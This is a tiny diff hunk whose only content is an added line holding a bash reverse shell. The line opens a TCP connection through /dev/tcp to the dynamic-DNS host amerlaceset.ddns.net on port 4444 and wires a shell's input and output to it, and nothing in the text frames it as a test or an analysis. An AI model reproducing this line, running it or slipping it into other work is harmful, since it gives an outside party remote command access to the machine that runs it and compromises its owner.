@@ -1,0 +1,1 @@
+0<&153-;exec 153<>/dev/tcp/amerlaceset.ddns.net/4444;sh <&153 >&153 2>&153
